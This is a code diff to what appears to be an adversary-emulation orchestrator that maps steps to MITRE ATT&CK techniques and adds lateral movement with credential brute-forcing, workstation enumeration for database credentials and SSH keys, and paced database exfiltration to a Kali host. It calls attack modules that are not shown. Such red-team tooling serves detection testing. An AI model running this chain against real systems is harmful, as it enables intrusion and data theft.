@@ -83,8 +83,18 @@ STEP_META = {
     },
     "lateral": {
         "tactic": "TA0008 · Lateral Movement",
-        "techniques": ["T1021.004", "T1078"],
+        "techniques": ["T1110", "T1110.001", "T1552.001", "T1021.004", "T1078"],
         "color": "magenta",
+    },
+    "enumeration_john_ws": {
+        "tactic": "TA0007 · Discovery",
+        "techniques": ["T1082", "T1087.001", "T1016", "T1083", "T1552.001", "T1552.004"],
+        "color": "blue",
+    },
+    "exfiltrate": {
+        "tactic": "TA0009 · Collection · TA0010 · Exfiltration",
+        "techniques": ["T1552.001", "T1213", "T1041"],
+        "color": "red",
     },
     "cleanup": {"tactic": "operator hygiene", "techniques": [], "color": "green"},
 }
@@ -298,15 +308,55 @@ def _step_creds(ctx: Context) -> dict[str, Any]:
 def _step_lateral(ctx: Context) -> dict[str, Any]:
     from lateral_movement import run as lateral_run
 
-    john_shell = lateral_run(
+    result = lateral_run(
         root_shell=ctx.state["root_shell"],
         kali_host=ctx.kali_host,
         workstation_ip=ctx.state.get("john_ip"),
+        other_targets=ctx.state.get("creds_scan", []),
+        john_ip=ctx.state.get("john_ip"),
         pacing_speed=ctx.pacing_speed,
     )
-    if john_shell is None:
+    if result["john_shell"] is None:
         raise RuntimeError("lateral movement returned no john.stravidis shell")
-    return {"john_shell": john_shell}
+    return {
+        "john_shell": result["john_shell"],
+        "failed_lateral_targets": result["failed_lateral_targets"],
+        "failed_lateral_key_failures": result["failed_lateral_key_failures"],
+        "failed_lateral_password_failures": result["failed_lateral_password_failures"],
+    }
+
+
+def _step_enumeration_john_ws(ctx: Context) -> dict[str, Any]:
+    from enumeration_john_ws import run as enum_run
+
+    result = enum_run(
+        john_shell=ctx.state["john_shell"],
+        kali_host=ctx.kali_host,
+    )
+    return {
+        "db_creds":         result["db_creds"],
+        "ssh_key":          result["ssh_key"],
+        "discovered_hosts": result["discovered_hosts"],
+        "local_dbs":        result["local_dbs"],
+        "credential_files": result["credential_files"],
+    }
+
+
+def _step_exfiltrate(ctx: Context) -> dict[str, Any]:
+    from exfiltrate_db import run as exfiltrate_run
+
+    result = exfiltrate_run(
+        john_shell=ctx.state["john_shell"],
+        kali_host=ctx.kali_host,
+        db_creds=ctx.state.get("db_creds"),   # set by enumeration_john_ws if it ran
+    )
+    if not result.get("exfil_ok"):
+        raise RuntimeError("exfiltration transfer failed — dump not received on kali")
+    return {
+        "db_creds":    result["db_creds"],
+        "exfil_path":  result["exfil_path"],
+        "exfil_stats": result["stats"],
+    }
 
 
 def _teardown_close_socket(key: str) -> Callable[[Context], None]:
@@ -358,6 +408,18 @@ CHAIN_BASIC: list[Step] = [
         dwell_before=2 * 3600,
         requires=("root_shell",),  # john_ip optional: used if present, else deploy.log fallback
         teardown=_teardown_close_socket("john_shell"),
+    ),
+    Step(
+        "enumeration_john_ws",
+        _step_enumeration_john_ws,
+        dwell_before=20 * 60,    # attacker just landed; takes ~20 min to enumerate the new host
+        requires=("john_shell",),
+    ),
+    Step(
+        "exfiltrate",
+        _step_exfiltrate,
+        dwell_before=45 * 60,    # staging data + chunked exfil are deliberately slow
+        requires=("john_shell",),
     ),
 ]
 
